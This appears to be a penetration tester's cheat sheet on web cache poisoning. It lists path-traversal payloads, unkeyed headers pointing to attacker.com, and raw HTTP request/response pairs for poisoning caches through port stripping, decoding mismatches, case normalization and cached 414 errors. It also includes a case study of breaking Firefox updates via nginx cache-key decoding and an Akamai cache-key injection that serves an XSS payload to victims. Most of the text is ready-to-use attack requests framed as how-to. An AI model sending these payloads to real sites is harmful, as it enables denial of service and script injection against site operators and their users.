- Find cacheble endpoint 

### Payloads for caching 404 paylods 

`/%2e%2e`
`test/../`
`test%2F..%2F`
`test%252F..%252F`

### Top header 

top 5 uncommon headers
```
X-Forwarded-Host: attacker.com
X-Forwarded-Port: 8080
X-Forwarded-Scheme: http
X-HTTP-Method-Override: HEAD
X-Host: attacker.com
X-Forwarded-Proto: http
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
```

- **`Host Header Port Transformation`**: If the caching server removes the port from the host header before generating the cache key, but sends the actual host header with port to the origin server, it can be used to **DoS** the homepage.
		For example:
		```
		GET / HTTP/1.1  
		Host: redacted.com:1337  
		  
		HTTP/1.1 301 Moved Permanently  
		Location: https://redacted.com:1337/en  
		CF-Cache-Status: MISS
		```
		Then we remove the port, replay the request, and see if we get a cache hit:
		```
		GET / HTTP/1.1  
		Host: redacted.com  
		  
		HTTP/1.1 301 Moved Permanently  
		Location: https://redacted.com:1337/en  
		CF-Cache-Status: HIT
		```

  	- **`DoS via Decoding Discrepancies`**: Similarly, if the origin server refuses to decode the URL path or query strings but the caching server does before generating the cache key and forwards the encoded path/query string to the server, it will lead to **DoS** if `404` response are cached. For ex:
		```
		GET /resources/im%61ges/blog.svg HTTP/2
		Host: redacted.com
		
		HTTP/2 404 Not Found
		Cache-Control: max-age=30
		Age: 3
		X-Cache: hit
		
		"Not Found"
		```
	- **`Path Case Normalization`**: During my research, I found that some applications were doing path case normalization before generating the cache key. Which means -- `script.js` and `SCRIPT.js` would hit the same endpoint but returns different responses.
	  For example: 
		```
		GET /SCRIPT.js HTTP/2
		Host: redacted.com
		
		HTTP/2 404 Not Found
		X-Cache: MISS
		``` 
		
		```
		GET /script.js HTTP/2
		Host: redacted.com 
		
		HTTP/2 404 Not Found
		X-Cache: HIT
		```
		This clearly leads to **DoS** if we poison the cache by requesting `SCRIPT.js` after the genuine cache expires. After `404 Not found` response gets cached -- every other request following that poisoned request to genuine endpoint would result in `404 Not Found` response.
	- **`Query Exclusion (414 response)`**: If any specific query is normalized or excluded from the cache key, try to alter the response with it. 
		For Example: 
		```
		GET /assets/anything?excludedQuery=<very-long-string> HTTP/2
		Host: redacted.com

		HTTP/2 414 Request-URI Too Long
		X-Cache: MISS
		```
		If the `414` response if cached by any chance, you will find a simple **DoS**.
		```
		GET /assets/anything HTTP/2
		Host: redacted.com

		HTTP/2 414 Request-URI Too Long
		X-Cache: HIT
		```

  - **`URL Normalization`**: Even something as simple as URL normalization can have serious consequences when applied to a cache key. As a case study, let's take down Firefox's update system. Firefox periodically checks for browser updates by issuing a request to download.mozilla.org:
		```
		GET /?product=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1 HTTP/1.1  
		Host: download.mozilla.org  
		  
		HTTP/1.1 301 Found  
		Location: https://download-installer.cdn.mozilla.net/pub/..firefox-73.mar
		```
		Until recently, the server configuration looked something like:
		```
		server {  
	   proxy_cache_key $http_x_forwarded_proto$proxy_host$uri$is_args$args;  
	   location / {  
		   proxy_pass http://upstream_bouncer;  
		   }  
		}
		```
		There's no issue with the proxy_cache_key setting here; in fact, it's very similar to nginx's default cache key. But if you look at [nginx's documentation for proxy_pass](https://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_pass), you'll find a clue to the problem: **If `proxy_pass` is specified without a URI, the request URI is passed to the server in the same form as sent by a client when the original request is processed**.
		
		The phrase 'in the same form' hints that the forwarded request won't be normalized, whereas the request components stored in the cache key may be. One form of normalization that nginx applies to the cache key is a full URL-decode.
		
		If you issue the update request with an encoded question mark, this will upset the back-end and result in a broken redirect:
		```
		GET /%3fproduct=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1 HTTP/1.1
		Host: download.mozilla.org  
		
		HTTP/1.1 301 Found  
		Location: https://www.mozilla.org/
		```
		But thanks to nginx's URL-decode, it'll have the same cache key as a legitimate update request. So from that point onwards, Firefox will fail to update globally:
		```
		GET /?product=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1 HTTP/1.1  
		Host: download.mozilla.org  
		  
		HTTP/1.1 301 Found  
		Location: https://www.mozilla.org/
		```
	- **`Cache Key Injection - Akamai`**: if a cache like Akamai happens to bundle all the key components into a string without bothering to escape delimiters, we can craft two requests that have the same cache key, even though they are semantically completely different:
		```
		GET /?x=2 HTTP/1.1  
		Origin: '-alert(1)-'__  
		  
		HTTP/1.1 200 OK  
		X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'__
		
		<script>…'-alert(1)-'…</script>
		```
		
		```
		GET /?x=2__Origin='-alert(1)-' HTTP/1.1  
		  
		HTTP/1.1 200 OK  
		X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'__  
		X-Cache: TCP_HIT  
		  
		<script>…'-alert(1)'-…</script>
		```
		By issuing the first request ourselves, and directing our victim to the second URL, we've made this XSS exploitable. Akamai are working on a fix. Note that if you find this strategy works on the Host header, you can likely get full control over every website using the target CDN.
